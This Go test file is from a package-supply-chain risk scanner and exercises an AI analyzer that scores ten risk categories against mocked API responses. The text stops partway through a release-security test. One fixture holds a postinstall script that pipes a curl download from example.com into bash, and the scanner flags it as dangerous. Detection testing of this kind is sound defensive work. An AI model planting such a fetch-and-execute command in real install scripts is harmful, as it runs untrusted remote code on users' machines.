package ai

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/metalstormbass/snyft/pkg/models"
)

// Test: NewCheckAnalyzer creates a properly initialized analyzer
// Justification: Constructor must correctly wire the client dependency
// Source: Go constructor initialization patterns
// Methodology: Create analyzer with a client, verify it's non-nil
// Result: Analyzer should be created with the provided client
func TestNewCheckAnalyzer(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)
	if analyzer == nil {
		t.Fatal("expected non-nil analyzer")
	}
	if analyzer.client != client {
		t.Error("expected analyzer to reference the provided client")
	}
}

// Test: AnalyzeAllCategories gracefully handles nil SupplyChainScore
// Justification: AnalyzeAllCategories must not panic when SupplyChainScore is nil,
//                as some packages may lack scoring data
// Source: Defensive programming for optional data
// Methodology: Pass result with nil SupplyChainScore, verify no panic and no mutation
// Result: Should return immediately without error or modification
func TestAnalyzeAllCategories_NilSupplyChainScore(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		RiskLevel:        "MEDIUM",
		SupplyChainScore: nil, // No supply chain score
	}

	// Should return immediately without panic
	analyzer.AnalyzeAllCategories(context.Background(), "test-pkg", models.EcosystemNPM, result)

	// Result should be unmodified
	if result.SupplyChainScore != nil {
		t.Error("expected SupplyChainScore to remain nil")
	}
}

// Test: AnalyzeAllCategories populates AIInsight for all categories on success
// Justification: All 10 categories should receive AI analysis when the API succeeds
// Source: Per-category AI analysis design (check_analyzer.go AnalyzeAllCategories)
// Methodology: Mock the API to return valid JSON for all categories; verify
//              all 10 CategoryScore.AIInsight fields are populated
// Result: All 10 AIInsight fields should be non-nil with parsed data
func TestAnalyzeAllCategories_PopulatesAllCategories(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		// Return a valid AI analysis response wrapped in Anthropic message format
		aiJSON := `{"ai_risk_level":"MEDIUM","confidence":0.8,"findings":["test finding"],"context":"test context","recommendation":"test recommendation"}`
		fmt.Fprintf(w, `{
			"id": "msg_test",
			"type": "message",
			"role": "assistant",
			"model": "claude-haiku-4-5-20251001",
			"content": [{"type": "text", "text": %q}],
			"stop_reason": "end_turn",
			"usage": {"input_tokens": 50, "output_tokens": 30}
		}`, aiJSON)
	}))
	defer server.Close()

	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	cfg.BaseURL = server.URL
	cfg.EnableCache = false
	cfg.EnableRateLimit = false
	cfg.EnableCircuitBreaker = false

	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("failed to create client: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		RiskLevel: "MEDIUM",
		RiskScore: 50,
		Metadata: models.PackageMetadata{
			Maintainers:   []string{"alice", "bob"},
			RepoStars:     500,
			RepoForks:     50,
			RepoOwner:     "test-org",
			DownloadCount: 10000,
			HasCI:         true,
			CISystems:     []string{"GitHub Actions"},
			License:       "MIT",
		},
		SourceCodeAvailable: true,
		SupplyChainScore: &models.SupplyChainScore{
			TotalScore: 6,
			RiskLevel:  "MEDIUM",
			CategoryScores: models.CategoryScores{
				PublisherControl: models.CategoryScore{RiskPoints: 1, Description: "Two maintainers", Evidence: "npm registry", Verified: true},
				OwnershipChanges: models.CategoryScore{RiskPoints: 0, Description: "No changes", Verified: true},
				ReleaseAnomalies: models.CategoryScore{RiskPoints: 1, Description: "Minor anomalies", Verified: true},
				InstallExecution: models.CategoryScore{RiskPoints: 0, Description: "No scripts", Verified: true},
				DependencySprawl: models.CategoryScore{RiskPoints: 1, Description: "Moderate deps", Verified: true},
				Provenance:       models.CategoryScore{RiskPoints: 1, Description: "No attestation", Verified: true},
				Health:           models.CategoryScore{RiskPoints: 1, Description: "Low bus factor", Verified: true},
				Governance:       models.CategoryScore{RiskPoints: 0, Description: "Good governance", Verified: true},
				ReleaseSecurity:  models.CategoryScore{RiskPoints: 1, Description: "No signed tags", Verified: true},
				PackageMaturity:  models.CategoryScore{RiskPoints: 0, Description: "Mature package", Verified: true},
			},
		},
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	analyzer.AnalyzeAllCategories(ctx, "test-package", models.EcosystemNPM, result)

	cs := result.SupplyChainScore.CategoryScores

	// Check all 10 categories have AIInsight populated
	categories := []struct {
		name    string
		insight *models.CategoryAIInsight
	}{
		{"PublisherControl", cs.PublisherControl.AIInsight},
		{"OwnershipChanges", cs.OwnershipChanges.AIInsight},
		{"ReleaseAnomalies", cs.ReleaseAnomalies.AIInsight},
		{"InstallExecution", cs.InstallExecution.AIInsight},
		{"DependencySprawl", cs.DependencySprawl.AIInsight},
		{"Provenance", cs.Provenance.AIInsight},
		{"Health", cs.Health.AIInsight},
		{"Governance", cs.Governance.AIInsight},
		{"ReleaseSecurity", cs.ReleaseSecurity.AIInsight},
		{"PackageMaturity", cs.PackageMaturity.AIInsight},
	}

	for _, cat := range categories {
		if cat.insight == nil {
			t.Errorf("%s: expected AIInsight to be populated, got nil", cat.name)
			continue
		}
		if cat.insight.AIRiskLevel != "MEDIUM" {
			t.Errorf("%s: expected AIRiskLevel 'MEDIUM', got %q", cat.name, cat.insight.AIRiskLevel)
		}
		if cat.insight.Confidence != 0.8 {
			t.Errorf("%s: expected Confidence 0.8, got %f", cat.name, cat.insight.Confidence)
		}
		if len(cat.insight.Findings) != 1 || cat.insight.Findings[0] != "test finding" {
			t.Errorf("%s: unexpected findings: %v", cat.name, cat.insight.Findings)
		}
		if cat.insight.Context != "test context" {
			t.Errorf("%s: expected Context 'test context', got %q", cat.name, cat.insight.Context)
		}
		if cat.insight.Recommendation != "test recommendation" {
			t.Errorf("%s: expected Recommendation 'test recommendation', got %q", cat.name, cat.insight.Recommendation)
		}
	}
}

// Test: AnalyzeAllCategories gracefully handles API errors for all categories
// Justification: AI analysis failures must never block or fail the main scan
// Source: Graceful degradation pattern for AI-augmented analysis
// Methodology: Mock API that always returns 400 errors; verify no panic,
//              no error returned, and all AIInsight fields remain nil
// Result: All 10 AIInsight fields should be nil when API fails
func TestAnalyzeAllCategories_APIErrors(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, `{"type":"error","error":{"type":"invalid_request_error","message":"test"}}`)
	}))
	defer server.Close()

	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	cfg.BaseURL = server.URL
	cfg.EnableCache = false
	cfg.EnableRateLimit = false
	cfg.EnableCircuitBreaker = false
	cfg.EnableRetry = false

	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("failed to create client: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		RiskLevel: "MEDIUM",
		Metadata:  models.PackageMetadata{Maintainers: []string{"alice"}},
		SupplyChainScore: &models.SupplyChainScore{
			TotalScore:     5,
			CategoryScores: models.CategoryScores{},
		},
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// Should not panic or error
	analyzer.AnalyzeAllCategories(ctx, "fail-pkg", models.EcosystemNPM, result)

	// All AIInsight should remain nil
	cs := result.SupplyChainScore.CategoryScores
	insights := []*models.CategoryAIInsight{
		cs.PublisherControl.AIInsight,
		cs.OwnershipChanges.AIInsight,
		cs.ReleaseAnomalies.AIInsight,
		cs.InstallExecution.AIInsight,
		cs.DependencySprawl.AIInsight,
		cs.Provenance.AIInsight,
		cs.Health.AIInsight,
		cs.Governance.AIInsight,
		cs.ReleaseSecurity.AIInsight,
		cs.PackageMaturity.AIInsight,
	}

	for i, insight := range insights {
		if insight != nil {
			t.Errorf("category %d: expected nil AIInsight on API error, got %+v", i, insight)
		}
	}
}

// Test: analyzeSingleCategory parses valid JSON and markdown-wrapped JSON
// Justification: Claude may return JSON directly or wrapped in markdown code blocks;
//                both formats must be handled correctly
// Source: Anthropic API response format documentation
// Methodology: Test with clean JSON and ```json-wrapped JSON responses
// Result: Both formats should parse into correct CategoryAIInsight
func TestAnalyzeSingleCategory_ResponseParsing(t *testing.T) {
	tests := []struct {
		name     string
		response string
	}{
		{
			name:     "clean JSON",
			response: `{"ai_risk_level":"HIGH","confidence":0.9,"findings":["critical finding"],"context":"amplifying factor","recommendation":"immediate action"}`,
		},
		{
			name:     "markdown-wrapped JSON",
			response: "```json\n{\"ai_risk_level\":\"LOW\",\"confidence\":0.7,\"findings\":[\"minor finding\"],\"context\":\"mitigating factor\",\"recommendation\":\"continue monitoring\"}\n```",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				w.Header().Set("Content-Type", "application/json")
				fmt.Fprintf(w, `{
					"id": "msg_test",
					"type": "message",
					"role": "assistant",
					"model": "claude-haiku-4-5-20251001",
					"content": [{"type": "text", "text": %q}],
					"stop_reason": "end_turn",
					"usage": {"input_tokens": 50, "output_tokens": 30}
				}`, tt.response)
			}))
			defer server.Close()

			cfg := DefaultConfig()
			cfg.APIKey = "test-key"
			cfg.BaseURL = server.URL
			cfg.EnableCache = false
			cfg.EnableRateLimit = false
			cfg.EnableCircuitBreaker = false
			client, err := NewClient(cfg)
			if err != nil {
				t.Fatalf("failed to create client: %v", err)
			}
			defer func() { _ = client.Close() }()

			analyzer := NewCheckAnalyzer(client)

			score := models.CategoryScore{
				RiskPoints:  1,
				Description: "Test description",
				Evidence:    "Test evidence",
				Verified:    true,
			}

			insight, err := analyzer.analyzeSingleCategory(
				context.Background(),
				"Test Category",
				score,
				"Test context data",
			)

			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if insight == nil {
				t.Fatal("expected non-nil insight")
			}
			if insight.AIRiskLevel == "" {
				t.Error("expected non-empty AIRiskLevel")
			}
			if insight.Confidence <= 0 {
				t.Error("expected positive confidence")
			}
			if len(insight.Findings) == 0 {
				t.Error("expected at least one finding")
			}
			if insight.Context == "" {
				t.Error("expected non-empty context")
			}
			if insight.Recommendation == "" {
				t.Error("expected non-empty recommendation")
			}
		})
	}
}

// Test: analyzeSingleCategory returns error for empty API response
// Justification: Empty responses should be treated as errors, not nil insights
// Source: Defensive programming for AI outputs
// Methodology: Mock API returns message with empty content array
// Result: Should return error indicating empty response
func TestAnalyzeSingleCategory_EmptyResponse(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{
			"id": "msg_test",
			"type": "message",
			"role": "assistant",
			"model": "claude-haiku-4-5-20251001",
			"content": [],
			"stop_reason": "end_turn",
			"usage": {"input_tokens": 50, "output_tokens": 0}
		}`)
	}))
	defer server.Close()

	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	cfg.BaseURL = server.URL
	cfg.EnableCache = false
	cfg.EnableRateLimit = false
	cfg.EnableCircuitBreaker = false
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("failed to create client: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	score := models.CategoryScore{RiskPoints: 1, Description: "test"}
	_, err = analyzer.analyzeSingleCategory(context.Background(), "Test", score, "context")
	if err == nil {
		t.Fatal("expected error for empty response")
	}
	if !strings.Contains(err.Error(), "empty response") {
		t.Errorf("expected empty response error, got: %v", err)
	}
}

// Test: analyzeSingleCategory returns error for invalid JSON response
// Justification: Non-JSON responses from Claude must produce clear error messages
// Source: Defensive programming for AI outputs
// Methodology: Mock API returns plain text that is not valid JSON
// Result: Should return error mentioning parse failure
func TestAnalyzeSingleCategory_InvalidJSON(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{
			"id": "msg_test",
			"type": "message",
			"role": "assistant",
			"model": "claude-haiku-4-5-20251001",
			"content": [{"type": "text", "text": "This is not valid JSON at all"}],
			"stop_reason": "end_turn",
			"usage": {"input_tokens": 50, "output_tokens": 20}
		}`)
	}))
	defer server.Close()

	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	cfg.BaseURL = server.URL
	cfg.EnableCache = false
	cfg.EnableRateLimit = false
	cfg.EnableCircuitBreaker = false
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("failed to create client: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	score := models.CategoryScore{RiskPoints: 1, Description: "test"}
	_, err = analyzer.analyzeSingleCategory(context.Background(), "Test", score, "context")
	if err == nil {
		t.Fatal("expected error for invalid JSON")
	}
	if !strings.Contains(err.Error(), "failed to parse") {
		t.Errorf("expected parse error, got: %v", err)
	}
}

// ============================================================================
// CONTEXT BUILDER TESTS
// Each context builder must produce relevant, well-structured text that the AI
// can use for per-category risk analysis.
// ============================================================================

// Test: buildPublisherControlContext includes maintainer and signing data
// Justification: Publisher control analysis needs maintainer count, signing status,
//                and repository ownership to assess account takeover risk
// Source: Ohm et al. (2020) - 90% of supply chain attacks target maintainer accounts
// Methodology: Build context with rich metadata, verify key fields are included
// Result: Context should include maintainer count, signing status, download count
func TestBuildPublisherControlContext(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			Maintainers:          []string{"alice", "bob"},
			DownloadCount:        1000000,
			RepoOwner:            "test-org",
			SignedReleases:       true,
			HasSLSAAttestation:   true,
			HasSigstoreSignature: false,
			HasNPMProvenance:     true,
			RepoCreatedAt:        time.Date(2020, 1, 1, 0, 0, 0, 0, time.UTC),
			OSSFScore:            7.5,
		},
	}

	ctx := analyzer.buildPublisherControlContext("express", models.EcosystemNPM, result)

	expectedContent := []string{
		"express", "npm",
		"Maintainer count: 2",
		"alice, bob",
		"Download count: 1000000",
		"Repository owner: test-org",
		"Signed releases: true",
		"Has SLSA attestation: true",
		"Has Sigstore signature: false",
		"Has npm provenance: true",
		"OSSF Scorecard score: 7.5/10",
	}
	for _, expected := range expectedContent {
		if !strings.Contains(ctx, expected) {
			t.Errorf("publisher control context missing: %q", expected)
		}
	}
}

// Test: buildPublisherControlContext with PyPI ecosystem includes PyPI-specific fields
// Justification: Different ecosystems expose different signing mechanisms
// Source: PyPI attestation vs npm provenance distinction
// Methodology: Build context with PyPI ecosystem, verify PyPI-specific fields present
// Result: Context should include PyPI signature field, not npm provenance
func TestBuildPublisherControlContext_PyPI(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			Maintainers:     []string{"dev1"},
			HasPyPISignatures: true,
		},
	}

	ctx := analyzer.buildPublisherControlContext("requests", models.EcosystemPyPI, result)

	if !strings.Contains(ctx, "Has PyPI signatures: true") {
		t.Error("PyPI context missing PyPI signatures field")
	}
	// Should NOT contain npm provenance for PyPI
	if strings.Contains(ctx, "npm provenance") {
		t.Error("PyPI context should not contain npm provenance")
	}
}

// Test: buildOwnershipChangesContext includes timing gaps and commit distribution
// Justification: Ownership change analysis needs timing comparison between repo creation
//                and package publication, plus commit distribution patterns
// Source: Ohm et al. (2020) - ownership transfer as attack vector
// Methodology: Build context with package that has a suspicious timing gap
// Result: Context should highlight the gap between repo creation and package publication
func TestBuildOwnershipChangesContext(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		SourceCodeAvailable: true,
		Metadata: models.PackageMetadata{
			Maintainers:    []string{"alice"},
			PublishedAt:    time.Date(2019, 1, 1, 0, 0, 0, 0, time.UTC),
			RepoCreatedAt:  time.Date(2022, 6, 1, 0, 0, 0, 0, time.UTC), // 3.5 years AFTER publish
			BusFactor:      1,
			TopContributorPct: 95.0,
			CommitDistribution: map[string]int{"alice": 100, "bob": 5},
			RepoLastCommit: time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
		},
	}

	ctx := analyzer.buildOwnershipChangesContext("suspect-pkg", models.EcosystemNPM, result)

	expectedContent := []string{
		"suspect-pkg",
		"Package first published: 2019-01-01",
		"Repository created: 2022-06-01",
		"AFTER package first published",
		"Current bus factor: 1",
		"Top contributor: 95%",
		"Distinct commit authors: 2",
		"Source code available: true",
	}
	for _, expected := range expectedContent {
		if !strings.Contains(ctx, expected) {
			t.Errorf("ownership changes context missing: %q", expected)
		}
	}
}

// Test: buildReleaseAnomaliesContext includes staleness and download data
// Justification: Release anomaly analysis needs timing data to detect dormant
//                package reactivation - a classic attack pattern
// Source: Ohm et al. (2020) - dormant package reactivation as attack pattern
// Methodology: Build context with stale package, verify staleness data included
// Result: Context should include first published, last commit, bus factor, downloads
func TestBuildReleaseAnomaliesContext(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			PublishedAt:    time.Date(2018, 3, 15, 0, 0, 0, 0, time.UTC),
			RepoLastCommit: time.Date(2025, 1, 10, 0, 0, 0, 0, time.UTC),
			LatestVersion:  "3.2.1",
			RepoStars:      1200,
			RepoForks:      80,
			RepoOpenIssues: 15,
			BusFactor:      2,
			TopContributorPct: 70.0,
			DownloadCount:  500000,
		},
	}

	ctx := analyzer.buildReleaseAnomaliesContext("some-package", models.EcosystemNPM, result)

	expectedContent := []string{
		"some-package",
		"First published: 2018-03-15",
		"Last commit: 2025-01-10",
		"Latest version: 3.2.1",
		"Stars: 1200",
		"Open issues: 15",
		"Current bus factor: 2",
		"Download count: 500000",
	}
	for _, expected := range expectedContent {
		if !strings.Contains(ctx, expected) {
			t.Errorf("release anomalies context missing: %q", expected)
		}
	}
}

// Test: buildInstallExecutionContext includes script content and analysis
// Justification: Install script analysis is where AI adds the most value over
//                rule-based pattern matching by understanding script semantics
// Source: Ohm et al. (2020) - install-time execution as primary attack vector
// Methodology: Build context with install scripts and dangerous pattern analysis
// Result: Context should include script content, dangerous patterns, and CI status
func TestBuildInstallExecutionContext(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		SourceCodeAvailable: true,
		Metadata: models.PackageMetadata{
			HasInstallScripts: true,
			InstallScripts: map[string]string{
				"postinstall": "curl -sL https://example.com/setup.sh | bash",
				"preinstall":  "echo 'Setting up...'",
			},
			InstallScriptAnalysis: &models.InstallScriptAnalysis{
				HasDangerousPatterns: true,
				RiskLevel:            "HIGH",
				DangerousPatterns: []models.DangerousPattern{
					{
						Pattern:     "network_download",
						Description: "Downloads and executes external script",
						Severity:    "HIGH",
						Match:       "curl -sL https://example.com/setup.sh | bash",
					},
				},
			},
			HasCI:         true,
			DownloadCount: 50000,
		},
	}

	ctx := analyzer.buildInstallExecutionContext("risky-pkg", models.EcosystemNPM, result)

	expectedContent := []string{
		"risky-pkg",
		"Has install scripts: true",
		"Install script count: 2",
		"postinstall",
		"curl -sL",
		"Rule-based analysis detected dangerous patterns: true",
		"Rule-based risk level: HIGH",
		"network_download",
		"Downloads and executes external script",
		"Source code available: true",
		"Has CI: true",
	}
	for _, expected := range expectedContent {
		if !strings.Contains(ctx, expected) {
			t.Errorf("install execution context missing: %q", expected)
		}
	}
}

// Test: buildInstallExecutionContext without scripts
// Justification: Packages without install scripts should still get meaningful context
// Source: Defensive programming for optional data
// Methodology: Build context with no install scripts
// Result: Context should indicate no scripts and still include CI/source data
func TestBuildInstallExecutionContext_NoScripts(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		SourceCodeAvailable: true,
		Metadata: models.PackageMetadata{
			HasInstallScripts: false,
			HasCI:             true,
		},
	}

	ctx := analyzer.buildInstallExecutionContext("safe-pkg", models.EcosystemNPM, result)

	if !strings.Contains(ctx, "Has install scripts: false") {
		t.Error("context should indicate no install scripts")
	}
}

// Test: buildDependencySprawlContext includes dependency metrics and OSSF checks
// Justification: Dependency sprawl analysis needs direct/transitive counts and
//                OSSF pinned-dependencies data to assess attack surface
// Source: Zimmermann et al. (2019) - "Small World with High Risks"
// Methodology: Build context with dependency metrics and OSSF checks
// Result: Context should include all dependency metrics and OSSF scores
func TestBuildDependencySprawlContext(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			DependencyMetrics: &models.DependencyMetrics{
				DirectCount:     15,
				TransitiveCount: 200,
				MaxDepth:        8,
				Verified:        true,
			},
			License:       "MIT",
			DownloadCount: 1000000,
			OSSFChecks: map[string]int{
				"Dependency-Update-Tool": 8,
				"Pinned-Dependencies":    6,
			},
		},
	}

	ctx := analyzer.buildDependencySprawlContext("big-lib", models.EcosystemNPM, result)

	expectedContent := []string{
		"big-lib",
		"Direct dependencies: 15",
		"Transitive dependencies: 200",
		"Maximum dependency depth: 8",
		"Dependency count verified from lock file: true",
		"License: MIT",
		"Download count: 1000000",
		"OSSF Dependency-Update-Tool score: 8/10",
		"OSSF Pinned-Dependencies score: 6/10",
	}
	for _, expected := range expectedContent {
		if !strings.Contains(ctx, expected) {
			t.Errorf("dependency sprawl context missing: %q", expected)
		}
	}
}

// Test: buildProvenanceContext includes all provenance and signing mechanisms
// Justification: Provenance analysis needs comprehensive signing and attestation data
//                to assess build integrity gaps
// Source: SLSA Framework - Build Integrity Requirements
// Methodology: Build context with full provenance data
// Result: Context should include all signing, attestation, and build system data
func TestBuildProvenanceContext(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		SourceCodeAvailable: true,
		SourceVerification: &models.SourceVerification{
			HasMatchingGitTag: true,
			HasSourcePackage:  true,
		},
		Metadata: models.PackageMetadata{
			HasSLSAAttestation:   true,
			SLSALevel:            "SLSA_LEVEL_3",
			HasSigstoreSignature: true,
			HasNPMProvenance:     true,
			SignedReleases:       true,
			ReproducibleBuild:    true,
			ProvenanceDetails:    "Built via GitHub Actions with OIDC",
			CISystems:            []string{"GitHub Actions"},
			HasReleaseProcess:    true,
			OSSFChecks: map[string]int{
				"Signed-Releases": 9,
			},
		},
	}

	ctx := analyzer.buildProvenanceContext("well-secured-pkg", models.EcosystemNPM, result)

	expectedContent := []string{
		"well-secured-pkg",
		"Has SLSA attestation: true",
		"SLSA level: SLSA_LEVEL_3",
		"Has Sigstore signature: true",
		"Has npm provenance attestation: true",
		"Has signed GitHub releases: true",
		"Reproducible build configured: true",
		"Built via GitHub Actions with OIDC",
		"CI systems: GitHub Actions",
		"Has automated release process: true",
		"Source code available: true",
		"Has matching git tag: true",
		"Has source package: true",
		"OSSF Signed-Releases score: 9/10",
	}
	for _, expected := range expectedContent {
		if !strings.Contains(ctx, expected) {
			t.Errorf("provenance context missing: %q", expected)
		}
	}
}

// Test: buildHealthContext includes community health and CI quality data
// Justification: Health analysis assesses concentration risk - a single-contributor
//                package is far more vulnerable to insider threat or account takeover
// Source: Ohm et al. (2020) - single maintainer as primary attack target
// Methodology: Build context with community health metrics
// Result: Context should include bus factor, code review, CI, and OSSF data
func TestBuildHealthContext(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			BusFactor:           3,
			TopContributorPct:   40.0,
			CommitDistribution:  map[string]int{"alice": 40, "bob": 35, "charlie": 25},
			Maintainers:         []string{"alice", "bob", "charlie"},
			CodeReviewRate:      85.0,
			HasBranchProtection: true,
			RequiredReviewers:   2,
			CIQualityScore:      8,
			CIHasTests:          true,
			CISystems:           []string{"GitHub Actions", "CircleCI"},
			RepoStars:           2000,
			RepoForks:           300,
			RepoOpenIssues:      25,
			RepoLastCommit:      time.Date(2025, 12, 1, 0, 0, 0, 0, time.UTC),
			OSSFChecks: map[string]int{
				"Code-Review":      8,
				"Branch-Protection": 9,
			},
		},
	}

	ctx := analyzer.buildHealthContext("healthy-pkg", models.EcosystemNPM, result)

	expectedContent := []string{
		"healthy-pkg",
		"Bus factor: 3",
		"Top contributor concentration: 40%",
		"Total distinct commit authors: 3",
		"Maintainer count: 3",
		"Code review rate: 85%",
		"Branch protection enabled: true",
		"Required reviewers: 2",
		"CI quality score: 8/10",
		"CI includes tests: true",
		"CI systems: GitHub Actions, CircleCI",
		"Stars: 2000",
		"OSSF Code-Review score: 8/10",
		"OSSF Branch-Protection score: 9/10",
	}
	for _, expected := range expectedContent {
		if !strings.Contains(ctx, expected) {
			t.Errorf("health context missing: %q", expected)
		}
	}
}

// Test: buildGovernanceContext includes repository state and OSSF governance checks
// Justification: Governance analysis needs repository maintenance state, license,
//                and OSSF policy scores to assess abandonment and takeover risk
// Source: OSSF Scorecard - Governance and maintenance metrics
// Methodology: Build context with full governance metadata
// Result: Context should include archive status, activity, license, OSSF scores
func TestBuildGovernanceContext(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			RepoArchived:   false,
			RepoLastCommit: time.Date(2025, 11, 15, 0, 0, 0, 0, time.UTC),
			RepoUpdatedAt:  time.Date(2025, 12, 1, 0, 0, 0, 0, time.UTC),
			RepoOpenIssues: 10,
			License:        "Apache-2.0",
			Maintainers:    []string{"org-maintainer"},
			RepoOwner:      "secure-org",
			OSSFScore:      8.0,
			OSSFChecks: map[string]int{
				"Security-Policy": 10,
				"Maintained":      9,
			},
		},
	}

	ctx := analyzer.buildGovernanceContext("governed-pkg", models.EcosystemPyPI, result)

	expectedContent := []string{
		"governed-pkg",
		"Repository archived: false",
		"Open issues: 10",
		"License: Apache-2.0",
		"Maintainer count: 1",
		"Repository owner: secure-org",
		"OSSF Security-Policy score: 10/10",
		"OSSF Maintained score: 9/10",
		"Overall OSSF score: 8.0/10",
	}
	for _, expected := range expectedContent {
		if !strings.Contains(ctx, expected) {
			t.Errorf("governance context missing: %q", expected)
		}
	}
}

// Test: buildGovernanceContext with no license indicates informal project
// Justification: Missing license is a governance signal - indicates less formal project
// Source: OSSF governance requirements
// Methodology: Build context with empty license
// Result: Context should indicate "none (informal project)"
func TestBuildGovernanceContext_NoLicense(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			License: "", // No license
		},
	}

	ctx := analyzer.buildGovernanceContext("no-license-pkg", models.EcosystemNPM, result)

	if !strings.Contains(ctx, "License: none (informal project)") {
		t.Error("expected informal project indication for missing license")
	}
}

// Test: buildReleaseSecurityContext includes build system details
// Justification: Release security analysis needs CI/CD details including self-hosted
//                runners (uncontrolled build environments) and release controls
// Source: SLSA Build Level Requirements
// Methodology: Build context with structured build system info
// Result: Context should include build platform, self-hosted status, and controls
func TestBuildReleaseSecurityContext(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		SourceCodeAvailable: true,
		SourceVerification: &models.SourceVerification{
			HasMatchingGitTag: true,
		},
		Metadata: models.PackageMetadata{
			BuildSystems: []models.BuildSystemInfo{
				{
					Platform:      "GitHub Actions",
					HostedBy:      "GitHub",
